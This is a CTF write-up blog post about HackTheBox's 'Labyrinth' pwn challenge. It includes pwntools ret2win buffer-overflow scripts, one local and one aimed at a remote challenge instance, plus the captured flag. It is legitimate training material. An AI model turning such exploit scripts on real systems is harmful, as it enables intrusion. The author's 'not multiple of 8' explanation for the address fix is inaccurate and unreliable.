@@ -1,0 +1,121 @@
+<!DOCTYPE html><html lang="en"> <head><!-- Google tag (gtag.js) --><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDSFLEY2WT"></script> <title>PWN - Labyrinth</title><meta charset="UTF-8"><link rel="canonical" href="https://ilter.tech/posts/htb-pwn-labyrinth/"><meta name="description" content="HacktheBox CTF - Cyber Apocalypse"><meta name="robots" content="index, follow"><meta property="og:title" content="PWN - Labyrinth"><meta property="og:type" content="website"><meta property="og:image" content="/opengraph-image.jpg"><meta property="og:url" content="https://ilter.tech/posts/htb-pwn-labyrinth/"><meta property="og:image:url" content="/opengraph-image.jpg"><meta property="og:image:alt" content="astro portfolio template image"><meta name="twitter:creator" content="@"><link rel="icon" href="/favicon.svg"><link rel="sitemap" href="/sitemap-index.xml"><meta content="width=device-width, initial-scale=1" name="viewport"><meta content="Astro v3.6.0" name="generator"><meta content="/opengraph-image.jpg" name="twitter:image"><meta content="summary_large_image" name="twitter:card"><meta content="PWN - Labyrinth" name="twitter:title"><meta content="Personal portfolio of Ugur Ilter, a software engineer based in Turkey." name="twitter:description"><meta content="@" name="twitter:site"><link rel="stylesheet" href="/_astro/index.a5a40b1c.css" /><script type="module">const d={online:{mclass:"st-green",text:"online",cclass:"st-c-green",aniclass:"ani-bg-green"},offline:{mclass:"st-red",text:"offline",cclass:"st-c-red",aniclass:""},idle:{mclass:"st-orange",text:"idle",cclass:"st-c-orange",aniclass:"ani-bg-orange"},dnd:{mclass:"st-red",text:"DnD",cclass:"st-c-red",aniclass:"ani-bg-red"}};function l(e){const n=e.d.discord_status,s=document.getElementById("ani-circle"),a=d[n].aniclass??"";s.classList.remove("ani-bg-green","ani-bg-red","ani-bg-orange"),a!==""&&s.classList.add(a)}function r(e){const n=document.getElementById("listening");n.innerHTML=e.state+" - "+e.details}function g(e){const n=document.getElementById("playing");n.innerHTML=e.name}function m(e){const n=document.getElementById("working");n.innerHTML=e.state.split("Workspace: ")[1]+"<br/>"+e.details.split("Editing ")[1]}function u(e){const n=document.getElementById("st-tooltip");n.innerHTML=d[e].text??""}function c(){const e=document.getElementById("listening"),n=document.getElementById("playing"),s=document.getElementById("working");e.innerHTML="-",n.innerHTML="-",s.innerHTML="-"}function i(e){var n=JSON.parse(e);document.getElementById("profile-pic");const s=n.d.discord_status;u(s),l(n);const a=n.d.activities;c(),a.forEach(t=>{t.name==="YouTube Music"?r(t):t.name==="Visual Studio Code"?m(t):t.name&&!t.details&&g(t)})}document.addEventListener("DOMContentLoaded",function(){c();const e=new WebSocket("wss://api.lanyard.rest/socket");let n={subscribe_to_id:"144871706257784832"},s=new Map;e.onmessage=a=>{const t=JSON.parse(a.data);switch(t.op){case 1:{e.readyState==e.OPEN&&e.send(JSON.stringify({op:2,d:n})),setInterval(()=>{e.readyState==e.OPEN&&e.send(JSON.stringify({op:3}))},t.d.heartbeat_interval);break}case 0:switch(t.t){case"INIT_STATE":{s=new Map([[t.d.discord_user.id,t.d]]),i(a.data);break}case"PRESENCE_UPDATE":{s.set(t.d.discord_user.id,t.d),i(a.data);break}}}}});window.dataLayer=window.dataLayer||[];function o(){dataLayer.push(arguments)}o("js",new Date);o("config","G-PDSFLEY2WT");
+</script></head><body class="mx-auto flex min-h-screen max-w-[1200px] flex-col gap-9 bg-neutral-950 px-10 py-8 text-sm text-neutral-400 md:gap-20 md:py-16"> <header class="z-40 flex w-full flex-col gap-2 md:flex-row md:justify-between"> <a href="mailto:ugur@ilter.tech" class="hover:text-neutral-100">ugur@ilter.tech</a> <nav role="navigation"> <ul role="list" class="flex flex-row gap-2"> <li> <a href="/" class="hover:text-neutral-100">Home</a> </li> <li>/</li> <li> <a href="/posts" class="hover:text-neutral-100">Posts</a> </li> <li>/</li> <li> <a href="/resume.pdf" class="hover:text-neutral-100">Resume</a> </li> </ul> </nav> </header> <div class="fixed z-0 h-[134px] w-[134px] lg:w-[300px] lg:h-[300px] rounded-full bg-orange-500 blur-[150px] md:blur-[350px] opacity-50 left-0 top-0"></div> <div class="fixed z-0 h-[134px] w-[134px] lg:w-[300px] lg:h-[300px] rounded-full bg-violet-500 blur-[150px] md:blur-[350px] opacity-50 right-0 bottom-0"></div>  <main class="post mx-auto flex w-full flex-col gap-4"> <header role="presentation"> <h1 class="text-md"> PWN - Labyrinth - 21/03/2023 </h1> <p class="italic">HacktheBox CTF - Cyber Apocalypse</p> </header> <pre class="astro-code nord" style="background-color:#2e3440ff;color:#d8dee9ff; overflow-x: auto;" tabindex="0"><code><span class="line"><span>Labyrinth</span></span>
+<span class="line"><span>You find yourself trapped in a mysterious labyrinth, with only one chance to escape.</span></span>
+<span class="line"><span>Choose the correct door wisely, for the wrong choice could have deadly consequences.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Points: 300</span></span>
+<span class="line"><span>Difficulty: Easy</span></span></code></pre>
+<p>In this challenge you are given a docker instance and also some files that you can download.
+The archive consisted of 2 files (flag.txt, labyrinth) and a folder which had some linux shared objects for the binary to run.</p>
+<p>Once you run the binary you are welcomed by an ascii art and a prompt asking you for a door number.</p>
+<pre class="astro-code nord" style="background-color:#2e3440ff;color:#d8dee9ff; overflow-x: auto;" tabindex="0"><code><span class="line"><span>▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span></span>
+<span class="line"><span>▒-▸        ▒           ▒          ▒</span></span>
+<span class="line"><span>▒-▸        ▒     O     ▒          ▒</span></span>
+<span class="line"><span>▒-▸        ▒    '|'    ▒          ▒</span></span>
+<span class="line"><span>▒-▸        ▒    / \    ▒          ▒</span></span>
+<span class="line"><span>▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Select door:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010</span></span>
+<span class="line"><span>Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020</span></span>
+<span class="line"><span>Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030</span></span>
+<span class="line"><span>Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040</span></span>
+<span class="line"><span>Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050</span></span>
+<span class="line"><span>Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060</span></span>
+<span class="line"><span>Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070</span></span>
+<span class="line"><span>Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080</span></span>
+<span class="line"><span>Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090</span></span>
+<span class="line"><span>Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>>></span></span></code></pre>
+<p>So i throw the binary to my decompiler and found out that the correct door number is ‘69’ or ‘069’.</p>
+<p><img src="/images/htb/pwn/labyrinth/correct_door.png" alt="HTB"></p>
+<p>After entering the correct door number we are again left with a new prompt.</p>
+<pre class="astro-code nord" style="background-color:#2e3440ff;color:#d8dee9ff; overflow-x: auto;" tabindex="0"><code><span class="line"><span>You are heading to open the door but you suddenly see something on the wall:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>"Fly like a bird and be free!"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Would you like to change the door you chose?</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>>></span></span></code></pre>
+<p>No matter what input you enter it does not work. Also looking at the decompiled source code there was no way to get the flag by entering ‘some correct answer’.
+This challenge requires a buffer overflow attack, so i created a new python script using pwntools. During my codewalk in the decompiled source i saw the function called ‘escape_plan’ which actually does open ‘flag.txt’ file and print out the flag. So i first needed the address of ‘escape_plan’ function, which i got via objdump.</p>
+<p><img src="/images/htb/pwn/labyrinth/func_address.png" alt="HTB"></p>
+<p>With the address (0x401255) in hand i tried sending different sizes of payloads to detect the offset required for rip register so i could inject the address of ‘escape_plan’ there to execute and get the flag. So the offset was 56. Afte that, i tried with the script and i was able to get the ascii art showing me that i was able to escape the labyrinth but there was no flag ! After a while (couple of hrs) i realized my mistake here and changed the address with 0x401256 since 0x401255 was not multiple of 8-bytes (64 bit addresses !).
+With the new fix in hand i was able to get the local flag.</p>
+<pre class="astro-code nord" style="background-color:#2e3440ff;color:#d8dee9ff; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#616E88">#!/usr/bin/python3.8</span></span>
+<span class="line"><span style="color:#81A1C1">from</span><span style="color:#D8DEE9FF"> pwn </span><span style="color:#81A1C1">import</span><span style="color:#81A1C1"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#81A1C1">def</span><span style="color:#88C0D0"> print_lines</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9">io</span><span style="color:#ECEFF4">):</span></span>
+<span class="line"><span style="color:#81A1C1">    while</span><span style="color:#81A1C1"> True</span><span style="color:#ECEFF4">:</span></span>
+<span class="line"><span style="color:#81A1C1">        try</span><span style="color:#ECEFF4">:</span></span>
+<span class="line"><span style="color:#D8DEE9FF">            line </span><span style="color:#81A1C1">=</span><span style="color:#D8DEE9FF"> io</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">recvline</span><span style="color:#ECEFF4">()</span></span>
+<span class="line"><span style="color:#88C0D0">            success</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">line</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">decode</span><span style="color:#ECEFF4">())</span></span>
+<span class="line"><span style="color:#81A1C1">        except</span><span style="color:#8FBCBB"> EOFError</span><span style="color:#ECEFF4">:</span></span>
+<span class="line"><span style="color:#81A1C1">            break</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D8DEE9FF">binary_path </span><span style="color:#81A1C1">=</span><span style="color:#ECEFF4"> "</span><span style="color:#A3BE8C">labyrinth</span><span style="color:#ECEFF4">"</span></span>
+<span class="line"><span style="color:#D8DEE9FF">elf         </span><span style="color:#81A1C1">=</span><span style="color:#88C0D0"> ELF</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">binary_path</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"><span style="color:#D8DEE9FF">offset </span><span style="color:#81A1C1">=</span><span style="color:#B48EAD"> 56</span></span>
+<span class="line"><span style="color:#616E88"># new_rip = p64(elf.symbols["escape_plan"])     # 0x401255 was not multiple of 8 !!!</span></span>
+<span class="line"><span style="color:#D8DEE9FF">return_address </span><span style="color:#81A1C1">=</span><span style="color:#88C0D0"> p64</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">elf</span><span style="color:#ECEFF4">.</span><span style="color:#D8DEE9FF">symbols</span><span style="color:#ECEFF4">[</span><span style="color:#ECEFF4">"</span><span style="color:#A3BE8C">main</span><span style="color:#ECEFF4">"</span><span style="color:#ECEFF4">])</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D8DEE9FF">payload </span><span style="color:#81A1C1">=</span><span style="color:#81A1C1"> b</span><span style="color:#ECEFF4">""</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">join</span><span style="color:#ECEFF4">(</span></span>
+<span class="line"><span style="color:#ECEFF4">    [</span></span>
+<span class="line"><span style="color:#81A1C1">        b</span><span style="color:#ECEFF4">"</span><span style="color:#A3BE8C">A</span><span style="color:#ECEFF4">"</span><span style="color:#81A1C1">  *</span><span style="color:#D8DEE9FF"> offset</span><span style="color:#ECEFF4">,</span></span>
+<span class="line"><span style="color:#616E88">        # new_rip,                              # get rid of this and use 0x401256</span></span>
+<span class="line"><span style="color:#81A1C1">        b</span><span style="color:#ECEFF4">'</span><span style="color:#EBCB8B">\x56\x12\x40\x00\x00\x00\x00\x00</span><span style="color:#ECEFF4">'</span><span style="color:#ECEFF4">,</span></span>
+<span class="line"><span style="color:#D8DEE9FF">        return_address</span></span>
+<span class="line"><span style="color:#ECEFF4">    ]</span></span>
+<span class="line"><span style="color:#ECEFF4">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#81A1C1">with</span><span style="color:#88C0D0"> open</span><span style="color:#ECEFF4">(</span><span style="color:#ECEFF4">"</span><span style="color:#A3BE8C">payload</span><span style="color:#ECEFF4">"</span><span style="color:#ECEFF4">,</span><span style="color:#ECEFF4"> "</span><span style="color:#A3BE8C">wb</span><span style="color:#ECEFF4">"</span><span style="color:#ECEFF4">)</span><span style="color:#81A1C1"> as</span><span style="color:#D8DEE9FF"> filp</span><span style="color:#ECEFF4">:</span></span>
+<span class="line"><span style="color:#D8DEE9FF">    filp</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">write</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">payload</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D8DEE9FF">io </span><span style="color:#81A1C1">=</span><span style="color:#88C0D0"> process</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">elf</span><span style="color:#ECEFF4">.</span><span style="color:#D8DEE9FF">path</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"><span style="color:#D8DEE9FF">io</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">recvregex</span><span style="color:#ECEFF4">(</span><span style="color:#81A1C1">b</span><span style="color:#ECEFF4">'</span><span style="color:#A3BE8C">>></span><span style="color:#ECEFF4">'</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"><span style="color:#D8DEE9FF">io</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">sendline</span><span style="color:#ECEFF4">(</span><span style="color:#81A1C1">b</span><span style="color:#ECEFF4">'</span><span style="color:#A3BE8C">069</span><span style="color:#ECEFF4">'</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"><span style="color:#D8DEE9FF">io</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">recvregex</span><span style="color:#ECEFF4">(</span><span style="color:#81A1C1">b</span><span style="color:#ECEFF4">'</span><span style="color:#A3BE8C">>></span><span style="color:#ECEFF4">'</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"><span style="color:#D8DEE9FF">io</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">sendline</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">payload</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"><span style="color:#88C0D0">print_lines</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">io</span><span style="color:#ECEFF4">)</span></span></code></pre>
+<p>Now it was time to create a new script with pwntools to run the bof attack on remote docker instance.</p>
+<pre class="astro-code nord" style="background-color:#2e3440ff;color:#d8dee9ff; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#616E88">#!/usr/bin/python3.8</span></span>
+<span class="line"><span style="color:#81A1C1">from</span><span style="color:#D8DEE9FF"> pwn </span><span style="color:#81A1C1">import</span><span style="color:#81A1C1"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#81A1C1">def</span><span style="color:#88C0D0"> print_lines</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9">io</span><span style="color:#ECEFF4">):</span></span>
+<span class="line"><span style="color:#88C0D0">    info</span><span style="color:#ECEFF4">(</span><span style="color:#ECEFF4">"</span><span style="color:#A3BE8C">printing io received lines</span><span style="color:#ECEFF4">"</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"><span style="color:#81A1C1">    while</span><span style="color:#81A1C1"> True</span><span style="color:#ECEFF4">:</span></span>
+<span class="line"><span style="color:#81A1C1">        try</span><span style="color:#ECEFF4">:</span></span>
+<span class="line"><span style="color:#D8DEE9FF">            line </span><span style="color:#81A1C1">=</span><span style="color:#D8DEE9FF"> io</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">recvline</span><span style="color:#ECEFF4">()</span></span>
+<span class="line"><span style="color:#88C0D0">            success</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">line</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">decode</span><span style="color:#ECEFF4">())</span></span>
+<span class="line"><span style="color:#81A1C1">        except</span><span style="color:#8FBCBB"> EOFError</span><span style="color:#ECEFF4">:</span></span>
+<span class="line"><span style="color:#81A1C1">            break</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#616E88"># Setup and open connection</span></span>
+<span class="line"><span style="color:#D8DEE9FF">IP   </span><span style="color:#81A1C1">=</span><span style="color:#ECEFF4"> '</span><span style="color:#A3BE8C">165.227.224.40</span><span style="color:#ECEFF4">'</span><span style="color:#616E88"> # Change this</span></span>
+<span class="line"><span style="color:#D8DEE9FF">PORT </span><span style="color:#81A1C1">=</span><span style="color:#B48EAD"> 30575</span><span style="color:#616E88">            # Change this</span></span>
+<span class="line"><span style="color:#D8DEE9FF">r    </span><span style="color:#81A1C1">=</span><span style="color:#88C0D0"> remote</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">IP</span><span style="color:#ECEFF4">,</span><span style="color:#D8DEE9FF"> PORT</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#616E88"># Craft payload</span></span>
+<span class="line"><span style="color:#D8DEE9FF">offset </span><span style="color:#81A1C1">=</span><span style="color:#B48EAD"> 56</span></span>
+<span class="line"><span style="color:#D8DEE9FF">padding </span><span style="color:#81A1C1">=</span><span style="color:#81A1C1"> b</span><span style="color:#ECEFF4">"</span><span style="color:#A3BE8C">A</span><span style="color:#ECEFF4">"</span><span style="color:#81A1C1"> *</span><span style="color:#D8DEE9FF"> offset</span></span>
+<span class="line"><span style="color:#D8DEE9FF">retaddr </span><span style="color:#81A1C1">=</span><span style="color:#88C0D0"> p64</span><span style="color:#ECEFF4">(</span><span style="color:#81A1C1">0x</span><span style="color:#B48EAD">401256</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"><span style="color:#D8DEE9FF">payload </span><span style="color:#81A1C1">=</span><span style="color:#81A1C1"> b</span><span style="color:#ECEFF4">""</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">join</span><span style="color:#ECEFF4">([</span><span style="color:#D8DEE9FF">padding</span><span style="color:#ECEFF4">,</span><span style="color:#D8DEE9FF"> retaddr</span><span style="color:#ECEFF4">])</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#616E88"># Wait for prompt</span></span>
+<span class="line"><span style="color:#88C0D0">print</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">r</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">recvregex</span><span style="color:#ECEFF4">(</span><span style="color:#81A1C1">b</span><span style="color:#ECEFF4">'</span><span style="color:#A3BE8C">>></span><span style="color:#ECEFF4">'</span><span style="color:#ECEFF4">).</span><span style="color:#88C0D0">decode</span><span style="color:#ECEFF4">())</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#616E88"># Send first input</span></span>
+<span class="line"><span style="color:#D8DEE9FF">r</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">sendline</span><span style="color:#ECEFF4">(</span><span style="color:#81A1C1">b</span><span style="color:#ECEFF4">'</span><span style="color:#A3BE8C">069</span><span style="color:#ECEFF4">'</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#616E88"># Wait for new prompt</span></span>
+<span class="line"><span style="color:#88C0D0">print</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">r</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">recvregex</span><span style="color:#ECEFF4">(</span><span style="color:#81A1C1">b</span><span style="color:#ECEFF4">'</span><span style="color:#A3BE8C">>></span><span style="color:#ECEFF4">'</span><span style="color:#ECEFF4">).</span><span style="color:#88C0D0">decode</span><span style="color:#ECEFF4">())</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#616E88"># Send payload</span></span>
+<span class="line"><span style="color:#D8DEE9FF">r</span><span style="color:#ECEFF4">.</span><span style="color:#88C0D0">sendline</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">payload</span><span style="color:#ECEFF4">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#616E88"># Get the flag !</span></span>
+<span class="line"><span style="color:#88C0D0">print_lines</span><span style="color:#ECEFF4">(</span><span style="color:#D8DEE9FF">r</span><span style="color:#ECEFF4">)</span></span></code></pre>
+<p><img src="/images/htb/pwn/labyrinth/flag.png" alt="HTB"></p>
+<pre class="astro-code nord" style="background-color:#2e3440ff;color:#d8dee9ff; overflow-x: auto;" tabindex="0"><code><span class="line"><span>Flag: HTB{3sc4p3_fr0m_4b0v3}</span></span></code></pre> </main>    <link rel="stylesheet" href="https://rsms.me/inter/inter.css"> </body></html>
